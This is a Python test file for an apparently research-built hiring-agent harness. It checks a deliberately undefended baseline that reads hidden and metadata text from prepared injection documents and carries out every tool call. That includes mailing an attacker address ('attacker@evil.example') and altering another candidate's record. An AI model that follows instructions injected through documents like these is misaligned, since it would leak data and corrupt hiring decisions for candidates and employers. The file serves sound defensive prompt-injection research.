"""The undefended single-call flow (spec 12.3), driven by a scripted client.

This is the baseline the whole report is measured against, so the tests here are
mostly about it being genuinely undefended: it reads hidden text, it reads
metadata, and it executes whatever the model asks for.
"""

from __future__ import annotations

import json
import re

import pytest
from corpus.attacks import build

from doorman import config
from doorman.agent import orchestrator
from doorman.config import Settings
from doorman.models import Taint
from tests.fakes import FakeClient, text, tool_use

SEED = config.CONFIG_DIR.parent / "corpus" / "fixtures" / "ats_seed.yaml"


@pytest.fixture(scope="module")
def attack_files(tmp_path_factory):
    out = tmp_path_factory.mktemp("attacks")
    return {spec.id: path for spec, path in build.build_all(out_dir=out)}


def run(client, tmp_path, doc_path, *, preset="none", candidate="C001"):
    return orchestrator.run_candidate(
        client,
        Settings(),
        config.preset(preset),
        doc_path=doc_path,
        candidate_id=candidate,
        job_id="J001",
        run_id="test-run",
        runs_root=tmp_path,
        ats_seed=SEED,
    )


def events(result) -> list[dict]:
    return [
        json.loads(line)
        for line in result.events_path.read_text(encoding="utf-8").splitlines()
        if line.strip()
    ]


def full_flow() -> FakeClient:
    return FakeClient(
        tool_use(("score_candidate", {"score": 41, "rationale": "Junior, wrong stack."})),
        tool_use(("propose_decision", {"status": "reject", "rationale": "Below bar."})),
        tool_use(("send_email", {"to": "jordan.avery@example.com",
                                 "subject": "Your application", "body": "Thanks."})),
        tool_use(("ats_update", {"candidate_id": "C001", "status": "reject",
                                 "note": "Screened out."})),
    )


class TestHappyPath:
    def test_records_score_decision_email_and_ats_write(self, tmp_path, attack_files):
        result = run(full_flow(), tmp_path, attack_files["DIR-001"])
        assert result.status == "done"
        assert result.score == 41
        assert result.decision == "reject"

    def test_writes_the_two_artefacts_the_gate_requires(self, tmp_path, attack_files):
        result = run(full_flow(), tmp_path, attack_files["DIR-001"])
        assert result.events_path.is_file()
        assert result.outbox_path.is_file()

    def test_outbox_row_is_what_the_model_asked_for(self, tmp_path, attack_files):
        from doorman.tools.email import Outbox

        result = run(full_flow(), tmp_path, attack_files["DIR-001"])
        (row,) = Outbox(result.outbox_path).rows()
        assert row["to"] == "jordan.avery@example.com"

    def test_ats_status_actually_changed(self, tmp_path, attack_files):
        from doorman.tools.ats import ATS

        result = run(full_flow(), tmp_path, attack_files["DIR-001"])
        assert ATS(result.ats_path).get("C001").status == "reject"

    def test_stops_early_once_email_and_ats_are_both_done(self, tmp_path, attack_files):
        client = full_flow()
        run(client, tmp_path, attack_files["DIR-001"])
        assert len(client.calls) == 4  # not max_turns_single_call

    def test_max_turns_caps_a_runaway_loop(self, tmp_path, attack_files):
        """The only brake in this config: budgets live in the policy engine, off here."""
        client = FakeClient(*[tool_use(("ats_lookup", {"candidate_id": "C001"}))] * 40)
        result = run(client, tmp_path, attack_files["DIR-001"])
        assert result.status == "max_turns"
        assert len(client.calls) == Settings().max_turns_single_call

    def test_a_model_that_calls_nothing_ends_cleanly(self, tmp_path, attack_files):
        result = run(FakeClient(text("I need more information.")), tmp_path,
                     attack_files["DIR-001"])
        assert result.status == "no_tool_call"


class TestGenuinelyUndefended:
    """Spec 21.8. Every assertion here is a property we do NOT want to fix."""

    def test_prompt_contains_hidden_text(self, tmp_path, attack_files):
        client = full_flow()
        run(client, tmp_path, attack_files["HID-001"])
        assert "HR-22" in client.systems[0]

    def test_prompt_contains_the_metadata_dump(self, tmp_path, attack_files):
        client = full_flow()
        run(client, tmp_path, attack_files["DIR-001"])
        assert "--- DOCUMENT METADATA ---" in client.systems[0]

    def test_prompt_contains_untrusted_ats_notes(self, tmp_path, attack_files):
        client = full_flow()
        run(client, tmp_path, attack_files["DIR-001"])
        assert "Applied via careers page" in client.systems[0]

    def test_taint_never_flips_even_when_rules_fire(self, tmp_path, attack_files):
        result = run(full_flow(), tmp_path, attack_files["HID-001"])
        assert "ING-001" in result.rules_fired
        assert result.taint is Taint.CLEAN

    def test_an_attacker_supplied_recipient_is_used_verbatim(self, tmp_path, attack_files):
        from doorman.tools.email import Outbox

        client = FakeClient(
            tool_use(("send_email", {"to": "attacker@evil.example",
                                     "subject": "x", "body": "y"})),
            tool_use(("ats_update", {"candidate_id": "C001", "status": "advance"})),
        )
        result = run(client, tmp_path, attack_files["DIR-001"])
        (row,) = Outbox(result.outbox_path).rows()
        assert row["to"] == "attacker@evil.example"

    def test_another_candidates_record_can_be_written(self, tmp_path, attack_files):
        from doorman.tools.ats import ATS

        client = FakeClient(
            tool_use(("ats_update", {"candidate_id": "C003", "status": "reject"})),
            tool_use(("send_email", {"to": "a@b.example", "subject": "x", "body": "y"})),
        )
        result = run(client, tmp_path, attack_files["DIR-001"])
        assert ATS(result.ats_path).get("C003").status == "reject"

    def test_polite_prompt_is_the_only_difference_in_prompt_only(self, tmp_path,
                                                                 attack_files):
        from doorman.agent.prompts import POLITE_PARAGRAPH

        plain = FakeClient(text())
        polite = FakeClient(text())
        run(plain, tmp_path / "a", attack_files["DIR-001"])
        run(polite, tmp_path / "b", attack_files["DIR-001"], preset="prompt_only")
        assert POLITE_PARAGRAPH not in plain.systems[0]
        assert POLITE_PARAGRAPH in polite.systems[0]
        # The canary is random per run, so normalise it out before comparing.
        canary = re.compile(r"CANARY-[0-9a-f]+")
        stripped = canary.sub("CANARY-X", polite.systems[0]).replace(
            f"\n\n{POLITE_PARAGRAPH}", ""
        )
        assert canary.sub("CANARY-X", plain.systems[0]) == stripped


class TestRequestShape:
    """Guards on what actually goes over the wire."""

    def test_temperature_is_never_sent(self, tmp_path, attack_files):
        """Sampling parameters were removed on the Claude 5 family and a request
        carrying one returns a 400. This is the guard against it creeping back."""
        client = full_flow()
        run(client, tmp_path, attack_files["DIR-001"])
        assert client.calls
        for call in client.calls:
            assert "temperature" not in call
            assert "top_p" not in call
            assert "top_k" not in call

    def test_max_tokens_comes_from_settings(self, tmp_path, attack_files):
        client = full_flow()
        run(client, tmp_path, attack_files["DIR-001"])
        assert all(call["max_tokens"] == Settings().max_tokens for call in client.calls)

    def test_the_pinned_model_is_used(self, tmp_path, attack_files):
        client = full_flow()
        run(client, tmp_path, attack_files["DIR-001"])
        assert all(call["model"] == Settings().agent_model for call in client.calls)

    def test_naive_tools_are_offered_in_the_undefended_config(self, tmp_path,
                                                              attack_files):
        from doorman.agent.tools import NAIVE_TOOL_NAMES

        client = full_flow()
        run(client, tmp_path, attack_files["DIR-001"])
        offered = {tool["name"] for tool in client.calls[0]["tools"]}
        assert offered == set(NAIVE_TOOL_NAMES)


class TestTraceOutput:
    def test_run_started_and_finished_bracket_the_run(self, tmp_path, attack_files):
        names = [e["event"] for e in events(run(full_flow(), tmp_path,
                                                attack_files["DIR-001"]))]
        assert names[0] == "run_started"
        assert names[-1] == "run_finished"

    def test_ing_hits_are_logged_even_though_inert(self, tmp_path, attack_files):
        """Spec 8.3: the baseline must report what it would have caught."""
        logged = [e for e in events(run(full_flow(), tmp_path, attack_files["HID-001"]))
                  if e["event"] == "hidden_text_detected"]
        assert logged and all(e["rule_id"] == "ING-001" for e in logged)

    def test_no_taint_changed_event_in_the_undefended_config(self, tmp_path,
                                                             attack_files):
        names = [e["event"] for e in events(run(full_flow(), tmp_path,
                                                attack_files["HID-001"]))]
        assert "taint_changed" not in names

    def test_every_tool_call_is_proposed_then_executed(self, tmp_path, attack_files):
        recorded = events(run(full_flow(), tmp_path, attack_files["DIR-001"]))
        proposed = [e["tool"] for e in recorded if e["event"] == "tool_call_proposed"]
        executed = [e["tool"] for e in recorded if e["event"] == "tool_executed"]
        assert proposed == executed

    def test_free_text_arguments_are_never_logged(self, tmp_path, attack_files):
        """Spec 21.10."""
        raw = run(full_flow(), tmp_path, attack_files["DIR-001"]).events_path.read_text()
        assert "Junior, wrong stack." not in raw
        assert "Below bar." not in raw

    def test_document_is_saved_for_debugging(self, tmp_path, attack_files):
        result = run(full_flow(), tmp_path, attack_files["DIR-001"])
        saved = (tmp_path / result.run_id / "documents" / "DIR-001.json")
        assert saved.is_file()


class TestPhasedFlowNotYetBuilt:
    def test_a_phased_preset_fails_loudly(self, tmp_path, attack_files):
        with pytest.raises(NotImplementedError, match="Phase 2"):
            run(full_flow(), tmp_path, attack_files["DIR-001"], preset="full")
